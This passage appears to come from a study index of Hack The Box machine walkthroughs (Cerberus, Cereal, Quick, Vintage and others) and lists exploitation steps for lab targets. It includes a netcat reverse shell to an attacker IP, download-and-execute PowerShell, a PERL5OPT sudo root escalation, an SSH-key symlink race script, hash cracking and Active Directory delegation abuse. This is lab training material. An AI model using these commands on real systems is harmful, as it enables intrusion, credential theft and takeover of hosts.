- Set http_proxy/HTTP_PROXY to the attacker so the privileged curl request passes through an intercepting proxy; configure Burp to listen on all interfaces.
- Return an XXE response that reads /root/.ssh/id_rsa, then use the recovered key to SSH as root.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
- Intercept XML input and test external-entity local file reads. Use disclosed usernames/source comments to target SSH keys or application configuration instead of guessing paths blindly.
- Inspect application/service environment variables and readable process environments for secrets, connection strings, internal endpoints, and runtime paths.

### Root / Administrator path

**Memory chain:** sudo rule abuse → XXE → private-key discovery → SSH

- Otherwise, the output of the curl command is saved in /root/diagnostic_files , for future inspection.
- After we forward the modified request, our payload gets executed and the root key is displayed on our shell.
- can save the root SSH key to a file, use chmod 600 root to set the correct permissions, and log in as root using SSH. ssh -i root root@clicker.htb root@clicker:~# id uid=0(root) gid=0(root) groups=0(root) The root flag can be found in /root/root.txt .
- Since the monitor.sh script calls xml_pp , which is a Perl script, the environment variables PERL5OPT and PERL5DB can still be abused to execute arbitrary commands, in this context, as root .
- This allows for the unintended exploitation path via a command such as: jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh jack@clicker:~$ bash -p root@clicker:~# id uid=0(root) gid=0(root) groups=0(root)

#### Commands and PDF search strings

- `ssh -i root root@clicker.htb`

### Artifacts and exact search anchors

`/usr/local/sbin`, `/usr/local/bin`, `/usr/sbin`, `/usr/bin`, `/opt/monitor.sh`, `monitor.sh`, `/usr/games`, `/usr/bin/curl`, `clicker.htb`, `diagnostic.php`, `/usr/bin/xml_pp`, `/usr/bin/date`, `/usr/bin/echo`, `/root/diagnostic_files/diagnostic_${timestamp}.xml`, `/root/diagnostic_files`, `/var/run/apache2`, `/var/run/apache2/apache2.pid`, `/var/lock/apache2`, `/var/log/apache2`, `/root/.ssh/id_rsa`, `/root/root.txt`

Open the PDF around page **12** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 62- Cerberus

**Target:** Windows / Linux · Hard

[Detailed notes](./htb-writeups/Cerberus.md) · [Official PDF](./htb-writeups/Cerberus.pdf)

### Machine path overview

Cerberus is a Hard Difficulty Windows machine that initially presents a scant range of open services. The primary point of entry is through exploiting a pre-authentication vulnerability in an outdated Icinga web application, which then leads to Remote Code Execution (RCE) and subsequently a reverse shell within a Linux container. Here, a Firejail SUID binary is discovered, which can be manipulated for privilege escalation inside the container using CVE-2022-31214 . Further investigation reveals that the machine utilizes Kerberos authentication with sssd , harboring a cached credential hash. Once cracked, this credential can is reused on the host machine, although this necessitates the forwarding of the WinRM port for access. Various local ports, some specific to ADSelfService Plus , are found active on the host machine, authenticated through SAML , and linked to a known CVE ( CVE-2022-47966 ) with an available Metasploit module. The final hurdle involves careful enumeration of the filesystem to locate a ManageEngine backup, which provides the necessary data for exploiting ADSS SAML authentication.

### Remote enumeration and foothold checks

- Use Icinga Web's pre-auth file-read issue to inspect documented configuration paths and recover Matthew's database/application credential.
- After authenticating as an Icinga administrator, exploit the SSH-resource certificate handling bug by embedding PHP around a valid PEM certificate and reach the written payload for RCE.
- Recognize the first shell as a Linux container; do not assume the Windows target has been reached.
- Use the pre-auth Icinga traversal endpoint /icingaweb2/lib/icinga/icinga-php-thirdparty{file} to read /etc/icingaweb2/authentication.ini and /etc/icingaweb2/resources.ini; resources.ini contains Matthew's database/application credential.
- For Icinga RCE, ssh-keygen output is rejected: generate a valid RSA private key with openssl genrsa, prepend PHP, set the SSH Identity resource User field to ../../../../../dev/shm/training/configuration.php, change the Icinga Module Path to /dev/shm, and visit the training module. The disclosure's OpenSSL NULL-byte route fails on this target because that library behavior is patched.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
- Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.

### Post-foothold local enumeration and lateral movement

- Enumerate SUID immediately: Firejail is vulnerable to CVE-2022-31214 and yields root inside the container.
- As container root, inspect /var/lib/sss/db; strings on the SSSD cache reveals Matthew's SHA-512 crypt hash, which can be cracked.
- WinRM is reachable only through the container/internal network; establish a SOCKS/route and use the cracked Matthew credential through the tunnel.
- On Windows, enumerate netstat -ano/listening ports and owning processes; the Java service on internal port 9251 is ADSelfService Plus.
- Tunnel a browser to https://dc.cerberus.local:9251 and preserve the internal hostname/SOCKS mapping.

### User path

**Memory chain:** Icinga pre-auth traversal → resources.ini Matthew credential → Icinga module-path PHP RCE → Linux container shell → Firejail CVE-2022-31214 → SSSD Matthew hash → tunneled WinRM

- Typically, it would be assumed that using ssh-keygen to get a key would work, but in this case, Icinga expects an RSA private key generated with OpenSSL .
- So let's create a key and submit it to Icinga and then use the LFI to verify it. openssl genrsa -out private-key.pem 1024 We can see that we are indeed successful in getting arbitrary file writes on the target.
- then run it on our first shell: chmod +x firejoin.py ./firejoin.py On the other shell we now run the command from the output: firejail --join=1724 And we are root !
- look at this file with strings and remove the repeated data to see what we can find. strings cache_cerberus.local.ldb | sort -u | head Right away we find a hash and going through this file even more indicates that the user will be matthew .
- Lets try and crack this... hashcat -a 0 -m 1800 hash /usr/share/wordlists/rockyou.txt $6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ 3.GQ.4N6bb9pxE3t3T0:147258369 Hashcat is able to crack the password, which is 147258369 .

#### Commands and PDF search strings

- `nmap -p$ports -Pn -sC -sV 10.10.11.205`
- `find / -perm -u=s -type f 2>/dev/null`
- `hashcat -a 0 -m 1800 hash /usr/share/wordlists/rockyou.txt`
- `wget http://10.10.14.46:8000/shell`

### Artifacts and exact search anchors

`/etc/hosts`, `/usr/bin/python3`, `private-key.pem`, `configuration.php`, `firejoin.py`, `/var/lib/sss`, `/var/lib/sss/db`, `/usr/share/wordlists/rockyou.txt`, `/etc/proxychains4.conf`, `proxychains4.conf`, `C:\users\matthew\desktop`

Open the PDF around page **5** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- CVE-2022-47966 requires ADSelfService SAML parameters; inspect C:\Program Files (x86)\ManageEngine\ADSelfService Plus\backup for the offline .ezip backup.
- Derive the backup password by reversing only the backup basename without `.ezip` (for example, reverse `OfflineBackup_20230214064809`).
- Obtain the assertion GUID by decoding the ADSelfService redirect's `SAMLRequest`; obtain `issuer_url` separately from the extracted offline backup, then configure the exploit with both values.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Try product-specific default credentials and obvious username/password pairs before exploit development; also search tickets/readmes for changed defaults.

### Root / Administrator path

**Memory chain:** ADSelfService Plus 9251 tunnel → decode redirect SAMLRequest GUID → offline backup issuer_url → CVE-2022-47966 → SYSTEM shell

- This shows some information about the SAML assertion as well as the GUID of the assertion. pVNdj9MwEHznV1h+bz5MLk2tJqfScqJSD6I2xwMvyHE2PUuOXWynd/fvcfpxFARFAilKJHt2d3ZmMr197iTag7F CqxzHQYQRKK4bobY5fqjuRhm+Ld5MLesk2dFZ7x7VGr71YB2aWQvG+bq5VrbvwGzA7AWHh/Uqx4/O7SwNw8WcTs hNHA4NVnorVJiOWdbEUZxOoiQiDU9ZOk6SOmt5xsacxYy3WVaTFqOFnyIUcwdq54YNDziYGkxvA6k5kyFrWhtKG 2K0XOT4K/Dspm14ndUJSzOScR5l2SQZx8S/Gk48zNoelso6plyOSUTejiL/TKo4ocmEEhKk4+gLRqXRTnMt3wl1 1KM3impmhaWKdWCp43Qzu19REkS0PoIs/VBV5aj8tKkODfaiAfPRo3N8zxTbwnvlRQA0W2xAtifFUCl7i9Hnsw1 ksMEboyw9Cn999O7EExdHn+hhQYPutOmYu147nIhm1B6gFJQT7uWn2dfL2TkDuPh/x6fhJf3iHLpBveWi1FLwFz STUj/NDTDnFXWmB/zXNeMg/mXNXtkdcNEKaHD4OueUa2gOKfehdvDs0Fx3O2aEHXyBZ8bdq8qXsLn0Sqyh/Sflr sI45UNvf1z6z5M2zRBL4J5nZZhfRBt3Fu53jIrT5R/2+3F9+W8X3wE= GUID: 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f If we Google adselfservice plus saml exploit we are lead to a Rapid7 writeup that includes a Metasploit module.
- download this module and save it to /usr/share/metasploitframework/modules/exploits/windows/http/ .
- Note: Depending on how you saved it, you can use the search command to find the module.
- It will most likely be available like so: use exploit/windows/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966 Using this module and looking at the required settings we can see GUID and ISSUER_URL are required. show options We already have the GUID , but we're missing the ISSUER_URL so we need to enumerate a bit more.
- The root flag can be found in C:\users\administrator\desktop .

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`/etc/hosts`, `/usr/share/metasploitframework/modules/exploits/windows/http/`, `C:\program files (x86)\manageengine\ADSelfService Plus\backup and find there`, `C:\program files (x86)\manageengine\ADSelfService Plus\backup`, `C:\users\administrator\desktop`

Open the PDF around page **17** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 63- Cereal

**Target:** Windows / IIS / .NET · Hard

[Detailed notes](./htb-writeups/Cereal.md) · [Official PDF](./htb-writeups/Cereal.pdf)

### Machine path overview

Cereal is a hard difficulty Windows machine with a repository exposing source code. One of the older commits is found to leak the encryption key, which can be used to login. Reviewing the code reveals deserialization and XSS vulnerabilities. These are leveraged to download a web shell and gain a foothold on the system. The user is found to have SeImpersonatePrivilege which is exploited in combination with a SSRF vulnerability to get SYSTEM privileges.

### Remote enumeration and foothold checks

- Inspect TLS SANs for cereal.htb and source.cereal.htb; enumerate both with .aspx extensions.
- Dump the exposed .git repository on source.cereal.htb and run git log -p; an older commit contains the JWT signing key removed from the current source.
- Forge the JWT in the exact cookie/location used by the Angular authentication service.
- Review RequestsController and the model binder: deserialization is localhost-only and filters ObjectDataProvider strings, so a direct remote payload is insufficient.
- Review AdminPage.jsx/package.json: stored Markdown is rendered by vulnerable react-marked-markdown, enabling XSS against the admin and a localhost request to the deserialization endpoint.
- Use the XSS to send the serialized payload internally and download/write the web shell.
- The deserialization filter blocks ObjectDataProvider, WindowsIdentity, and System gadget strings; use the in-application Cereal.DownloadHelper type with URL and FilePath set to C:\inetpub\source\uploads\cmd.aspx. The server prefixes the downloaded name with 21098374243-, so trigger /uploads/21098374243-cmd.aspx.
- The react-marked-markdown XSS requires javascript-link/backtick syntax, and literal parentheses are unusable in this Markdown path; encode the XHR parentheses as \x28 and \x29 so the admin browser can make the localhost-only request that triggers deserialization.
- Cereal is a Windows IIS/.NET target; the CSV's Linux environment label is incorrect.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- Inspect TLS certificate SAN/CN values for hidden virtual hosts and add each name to `/etc/hosts` before directory/content discovery.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Identify the exact serialization format, signing/encryption boundary, and gadget environment before generating a payload; source review often reveals the required class/library.
- Check who can read LAPS attributes and query the correct computer object. The password is host-specific; use it with the local Administrator context, not automatically as a domain credential.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.

### Post-foothold local enumeration and lateral movement

- Read C:\inetpub\cereal\db\cereal.db for Sonny's credential and SSH as Sonny.
- Check privileges and local listeners: Sonny has SeImpersonatePrivilege and port 8080 is bound to localhost.
- Forward 127.0.0.1:8080 over SSH and enumerate /api/graphql queries/mutations with GraphQL Playground.

### User path

**Memory chain:** SSH → virtual-host enumeration → group-membership abuse → source-code review → directory/file discovery → Git history/config → authentication bypass → unsafe deserialization → configuration-file secrets → web shell/RCE

- As we can see, the key is redacted, which means we can't forge cookies.
- The package.json configuration file reveals the package react-marked-markdown with version 1.4.6.
- Now that we're able to send requests via localhost, we can try and exploit the deserialization.
- Looking through the web root, we find the SQLite database.
- Executing the command type C:\inetpub\cereal\db\cereal.db will reveal the credentials for sonny as sonny / mutual.madden.manner38974 .

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.10.217`
- `gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u`
- `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdbwebshell/asp/cmd.aspx`
- `ssh sonny@cereal.htb`

### Artifacts and exact search anchors

`cereal.htb`, `source.cereal.htb`, `/etc/hosts`, `C:\inetpub\source . We keep this in our notes and proceed with further enumeration`, `/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt`, `git_dumper.py`, `appsettings.json`, `this.props.request.json`, `package.json`, `cmd.aspx`, `C:\\\\inetpub\\\\source\\\\uploads\\\\cmd.aspx`, `21098374243-cmd.aspx`, `C:\inetpub\cereal\db\cereal.db will reveal the credentials for`, `cereal.db`

Open the PDF around page **8** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- The updatePlant GraphQL mutation fetches sourceURL and supplies the SSRF/coercion primitive.
- Run GenericPotato's local HTTP listener and point sourceURL at http://localhost:8888 to combine SSRF with SeImpersonate token capture.
- Use the duplicated privileged token to launch the SYSTEM payload.
- Confirm `SeImpersonatePrivilege`, OS build, and available coercion path before selecting a Potato/PrintSpoofer-style token impersonation technique.
- Use SSH/local/dynamic port forwarding for internal-only services and hidden vhosts. Preserve the required Host header/DNS name through the tunnel rather than browsing only `localhost`.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Use SSRF to enumerate loopback/internal ports, cloud metadata, and internal HTTP APIs. Compare status, size, and timing when responses are not reflected.

### Root / Administrator path

**Memory chain:** SeImpersonate/token abuse → SSH → SSRF → reverse shell → NTLM relay/coercion

- GraphQL endpoints are often vulnerable to introspection, which can be used to find the queries and mutations it supports.
- This will allow us to create an HTTP listener on the victim and then after we trigger the SSRF , it will steal the token and run the command we specify as the user/service running the website.
- PS C:\Windows\system32> We have successfully rooted the box and can navigate to the Administrator's Desktop to find the root flag!
- This is a newer version of the potato exploits that only requires a user that has SeImpersonatePrivilege and abuses DCOM/RPC object activation handled by rpcss.exe to coerce a privileged service into authenticating.
- Finally we'll execute GodPotato and have it trigger a reverse shell for us.

#### Commands and PDF search strings

- `ssh -L 8080:127.0.0.1:8080 sonny@cereal.htb`
- `curl -X POST http://127.0.0.1:8080/api/graphql -H 'Content-Type:`

### Artifacts and exact search anchors

`cereal.htb`, `C:\Users\sonny\Desktop`, `C:\Users\sonny\Desktop\nc64.exe`, `C:\Windows\system32`, `c:\Users\sonny\Desktop\nc64.exe 10.10.14.4 9001 -e cmd`

Open the PDF around page **14** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 64- Quick

**Target:** Linux · Hard

[Detailed notes](./htb-writeups/Quick.md) · [Official PDF](./htb-writeups/Quick.pdf)

### Machine path overview

Quick is a hard difficulty Linux machine that features a website running on the HTTP/3 protocol. Enumeration of the website reveals default credentials. The client portal is found to be vulnerable to ESI (Edge Side Includes) injection. This is used to obtain code execution and gain a foothold. A weak password gives access to a printer console, which permits the addition of new printers. Weak file permissions are exploited to move laterally. Plaintext credentials exposed in a configuration are reused to escalate to root.

### Remote enumeration and foothold checks

- Port 9001 is the visible Apache site, but also enumerate HTTP/3/QUIC with an appropriate client; the connectivity PDF contains the portal default password and client identity clues.
- Build likely client email addresses from testimonials/company names and test the disclosed shared password.
- The ticket portal interprets Edge Side Includes; use ESI/XSLT Java Runtime execution to stage and run a shell.
- The portal is HTTP/3 over UDP 443 and ordinary browser enumeration does not expose it in the writeup's setup. Build Cloudflare quiche's examples and use target/debug/examples/http3-client to request https://portal.quick.htb?view=docs and download docs/Connectivity.pdf, which holds the shared portal password.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
- After landing on Linux, inspect Apache configuration (`apachectl -S`, `/etc/apache2/sites-enabled/*`, `sites-available/*`, included configs, and `.htaccess`). Record hidden `ServerName`/aliases, document roots, proxy targets, access-control headers, credentials, and localhost-only vhosts, then tunnel/enumerate them.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- Try product-specific default credentials and obvious username/password pairs before exploit development; also search tickets/readmes for changed defaults.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.

### Post-foothold local enumeration and lateral movement

- After landing as Sam, inspect /var/www and the Apache site configuration, not just files in the current web root.
- Read /etc/apache2/sites-enabled/000-default.conf: it exposes the hidden printerv2.quick.htb vhost and shows it runs as srvadm; add that vhost to /etc/hosts.
- Read /var/www/printer/index.php and db.php; recover the MySQL credential, query the allowed srvadm account hash, and reproduce md5(crypt(password,'fa')) to crack it.
- In the printer console, inspect job.php and exploit the predictable/writable print-job file handling to replace the queued file with srvadm's SSH key before the privileged read.

### User path

**Memory chain:** SSH → group-membership abuse → Git history/config → reverse shell → printer-configuration secrets → virtual-host enumeration → subdomain enumeration → default credentials → database enumeration → source-code review

- A list of emails can be created based on this: tim@qconsulting.co.uk roy@darkwing.co.us elisa@wink.co.uk james@lazycoop.cn Attempting to login with these emails and the password Quick4cc3$$ gives us access to the user Elisa .
- Next, edit the XSL file with the following command: <xsl:variable name="cmd"><![CDATA[bash /tmp/shell]]> This should execute the reverse shell present in /tmp/shell .
- Lateral Movement Inspecting the web root reveals two non-default folders named printer and jobs .
- This hash is checked against the one obtained from database.
- A small bash script can be written to achieve this. #!/bin/bash while true do job=`ls /var/www/jobs` if [[ $job ]] then echo $job ln -sf /home/srvadm/.ssh/id_rsa /var/www/jobs/$job fi sleep 0.1 done The script runs in a loop and links any file found to the user's SSH key.

#### Commands and PDF search strings

- `nmap -sC -sV -p$ports 10.10.10.186`
- `wget 10.10.14.4/replace.sh`

### Artifacts and exact search anchors

`portal.quick.htb`, `quick.htb`, `/tmp/shell`, `esi.xml`, `/etc/apache2/sites-enabled/000-default.conf`, `000-default.conf`, `printerv2.quick.htb`, `/var/www/printer/index.php`, `index.php`, `db.php`, `home.php`, `check.php`, `/usr/share/wordlists/rockyou.txt`, `job.php`, `/var/www/jobs/`, `/var/www/printer/jobs/`, `/var/www/jobs`, `/home/srvadm/.ssh/id_rsa`, `/var/www/jobs/$job`, `replace.sh`

Open the PDF around page **10** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- As srvadm, recursively grep the home .cache/configuration files for root, srvadm, or password.
- A printer connection string contains a URL-encoded plaintext password; URL-decode it and test credential reuse with su root.

### Root / Administrator path

**Memory chain:** printer-configuration secrets → password decryption → credential reuse → su to root

- The home folder of this is found to contain a .cache directory.
- grep for such strings with credentials. grep -ERni 'root|srvadm|password' .
- The search returns all strings matching root , srvadm or password irrespective of their case ( -i ).
- One of the configuration files is found to contain a password within a connection string, which is URL encoded.
- The password &ftQ4K3SGde8? is found to be valid for root and can be used to switch to it.

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

No stable artifact was extracted automatically; use the decision checks and commands.

Open the PDF around page **20** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 65- Vintage

**Target:** Windows / Active Directory · Hard

[Detailed notes](./htb-writeups/Vintage.md) · [Official PDF](./htb-writeups/Vintage.pdf)

### Machine path overview

Vintage is a hard difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment without ADCS installed, and NTLM authentication is disabled. There is a "Pre-Created computer account," meaning the password is the same as the sAMAccountName of the machine account. The "Domain Computer" organisational unit (OU) has a configuration allowing attackers to read the service account password, which has gMSA configured. After obtaining the password, the service account can add itself to a privileged group. The group has complete control over a disabled user. The attacker is supposed to restore the disabled user and set a Service Principal Name (SPN) to perform Kerberoasting. After recovering the password, the user account has reused the same password. The newly compromised user has a password stored in the Credential Manager. The user can add itself to another privileged group configured for Resource-Based Constrained Delegation (RBCD) on the Domain Controller, allowing the attacker to compromise it.

### Remote enumeration and foothold checks

- NTLM is disabled: configure DNS/FQDN ordering, krb5.conf, clock, kinit/ccache, and use GSSAPI/Kerberos for LDAP, SMB, and BloodHound.
- BloodHound reveals a pre-created FS01$ computer account; test the pre-Windows-2000 convention where the lowercase sAMAccountName without $ is the password.
- Use FS01$'s Domain Computers membership and ReadGMSAPassword edge to retrieve GMSA01$'s msDS-ManagedPassword/NT hash.
- Create/use a keytab or TGT for GMSA01$, add it to ServiceManagers through AddSelf, and request a fresh ticket so new group membership is reflected.
- ServiceManagers can control disabled svc_sql: enable the account, set an SPN, Kerberoast it, and crack the service password.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- If an account/group can read a gMSA password, retrieve `msDS-ManagedPassword`, derive the NT hash, and authenticate as the managed service account.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- With any valid domain credential or ticket, request SPN service tickets (`GetUserSPNs`) and crack them; do not assume the SPN account is obviously privileged.
- Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.
- For RBCD, obtain/control a machine account, write `msDS-AllowedToActOnBehalfOfOtherIdentity`, request an impersonation service ticket, and use the ticket against the correct SPN.
- Inspect application/service environment variables and readable process environments for secrets, connection strings, internal endpoints, and runtime paths.

### Post-foothold local enumeration and lateral movement

- Follow password reuse from svc_sql to an interactive user, then inspect Windows Credential Manager/DPAPI secrets after landing.
- Re-collect/inspect BloodHound after each group change because the later RBCD edge depends on the newly compromised user's group membership.
- Evil-WinRM is a network logon and cannot expose C.Neri's saved Credential Manager secret. Use Invoke-RunasCs as C.Neri with logon type 2/default interactive logon and -ForceProfile, then run cmdkey /list plus Invoke-WCMDump or SharpDPAPI to recover C.Neri_adm.

### User path

**Memory chain:** LDAP enumeration → SMB enumeration → Kerberos ticket abuse → BloodHound path analysis → ACL abuse → gMSA password retrieval → group-membership abuse → Kerberoasting → password cracking → WinRM

- have a machine account member of the "Pre Windows 2000 Compatible Access" group.
- The WinRM session is not an interactive session but rather a network logon; one can find a better explanation on Bitvise blog.
- The RunasCs tool has mentioned forcing the profile to allow the spawned process to have all required environment variables and user profiles.
- This will ensure the process will have the environment variables correctly set.
- PS C:\Windows\system32> IEX(iwr -uri http://10.10.14.5/Invoke-WCMDump.ps1 UseBasicParsing) PS C:\Windows\system32> Invoke-WCMDump Username : vintage\c.neri_adm Password : Uncr4ck4bl3P4ssW0rd0312 Target : admin_acc Description : LastWriteTime : 6/7/2024 5:08:23 PM LastWriteTimeUtc : 6/7/2024 3:08:23 PM Type : Generic PersistenceType : Enterprise

#### Commands and PDF search strings

- `nmap -Pn -p$ports -sC -sV 10.10.11.45`
- `netexec smb 10.10.11.45 -u p.rosa -p Rosaisbest123`
- `sudo net time set -S vintage.htb`
- `netexec ldap 10.10.11.45 -d vintage.htb -u 'fs01$' -p 'fs01' -k`
- `netexec ldap 10.10.11.45 -d vintage.htb -u 'GMSA01$' -H`
- `john -w=/usr/share/wordlists/rockyou.txt hashes.txt`
- `netexec ldap 10.10.11.45 -d vintage.htb -u users.txt -p 'Zer0the0ne' -k`
- `evil-winrm -i dc01.vintage.htb -r vintage.htb`
- `Evil-WinRM shell v3.3`

### Artifacts and exact search anchors

`dc01.vintage.htb`, `vintage.htb`, `krb5.conf`, `/etc/hosts`, `/tmp/krb5cc_1001`, `bloodhound.py`, `FS01.vintage.htb`, `20250417010248_bloodhound.zip`, `msDS-ManagedPassword`, `/tmp/GMSA01.keytab`, `getTGT.py`, `/usr/share/wordlists/rockyou.txt`, `C:\Users\C.Neri\Documents`, `C:\Users\C.Neri\Desktop\user.txt`, `C:\Users folder`, `RunasCs.ps1`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `C:\Windows\system32`, `Invoke-WCMDump.ps1`

Open the PDF around page **5** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Add the controlled user to the group that has write access to the DC's RBCD attribute.
- Set msDS-AllowedToActOnBehalfOfOtherIdentity/PrincipalsAllowedToDelegateToAccount for the controlled principal, request the appropriate impersonation service ticket, and target a DC service SPN.
- Use the delegated ticket for administrative access/DCSync while keeping Kerberos cache and SPN names exact.
- After adding FS01$ to DelegatedAdmins, obtain its TGT with kinit -f; a normal kinit ticket is not forwardable and getST fails with 'Initial TGT not forwardable.'
- Administrator is restricted from network/delegation logons on this target. Impersonate Domain Admin L.BIANCHI_ADM instead and request cifs/dc01.vintage.htb with -altservice HTTP/dc01.vintage.htb so the resulting ticket can be used for WinRM.
- For RBCD, obtain/control a machine account, write `msDS-AllowedToActOnBehalfOfOtherIdentity`, request an impersonation service ticket, and use the ticket against the correct SPN.
- Enumerate MSSQL `IMPERSONATE` permissions and test `EXECUTE AS LOGIN/USER`; re-check effective server roles after impersonation.

### Root / Administrator path

**Memory chain:** Kerberos ticket abuse → delegation/RBCD → WinRM

- The extracted credentials indeed work for c.neri_adm ; we can now request a Kerberos ticket, add the FS01$ machine account to the DelegateAdmins group, request a new ticket for the computer account, and perform an RBCD attack.
- If the attacker uses kinit by default, the ticket is not forwardable and will give an " Initial TGT not forwardable " error message.
- The L.BIANCHI_ADM user account is a member of Domain Admins.

#### Commands and PDF search strings

- `impacket-getST -spn 'cifs/dc01.vintage.htb' -altservice 'HTTP/dc01.vintage.htb'`
- `evil-winrm -i dc01.vintage.htb -r vintage.htb`
- `Evil-WinRM shell v3.3`

### Artifacts and exact search anchors

`krb5.conf`, `VINTAGE.HTB`, `/tmp/krb5cc_1001`, `dc01.vintage.htb`, `HTTP_dc01.vintage.htb`, `C:\Users\L.Bianchi_adm\Documents`, `C:\users\Administrator\Desktop\root.txt`

Open the PDF around page **13** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 66- RustyKey

**Target:** Windows / Active Directory · Hard

[Detailed notes](./htb-writeups/RustyKey.md) · [Official PDF](./htb-writeups/RustyKey.pdf)

### Machine path overview

RustyKey is a hard difficulty Windows Machine which showcases a Timeroasting Attack, Active Directory ACL abuse following Windows Group Policy Enumeration to abuse the 7-Zip Shell Extension. For Privilege escalation, Active Directory Delegations are abused using a SPN-less Resource-Based Constrained Delegation attack.

### Remote enumeration and foothold checks

- The supplied credential fails with NTLM STATUS_NOT_SUPPORTED; obtain/export a Kerberos TGT and target dc.rustykey.htb by FQDN with --use-kcache.
- Scan UDP as well as TCP: NTP/123 enables NetExec timeroast, which returns machine/trust-account hashes.
- Patch timecrack's wordlist reader to latin-1 if rockyou triggers UnicodeDecodeError; crack RID 1125 and map that RID with lookupsid to IT-Computer3$.
- BloodHound shows IT-Computer3$ can add itself to HelpDesk, and HelpDesk can ForceChangePassword on bb.morgan; perform both and obtain a fresh TGT before WinRM.
- If bb.morgan TGT acquisition returns KDC_ERR_PREAUTH_FAILED after the HelpDesk password reset, the cleanup task has reverted the changed password; force-change bb.morgan again and immediately request a fresh TGT.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
- Perform RID/SID cycling with `impacket-lookupsid`; save only `SidTypeUser` names for spraying. Try null, guest, and any low-privilege credential because each may expose different ranges.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.

### Post-foothold local enumeration and lateral movement

- Enumerate SYSVOL locally and parse GptTmpl.inf/Registry.pol rather than only checking shares remotely.
- The GPO denies Support network logon but grants the Support SID WriteKey on the 7-Zip shell-extension CLSID; decode the SDDL with PowerView.
- Force-change ee.reed, remove/avoid Protected Objects restrictions as needed, and use RunasCs for an interactive/service-session shell because WinRM network logon is denied.
- Point HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32 at a malicious DLL and wait for the simulated 7-Zip context-menu action to obtain mm.turner.

### User path

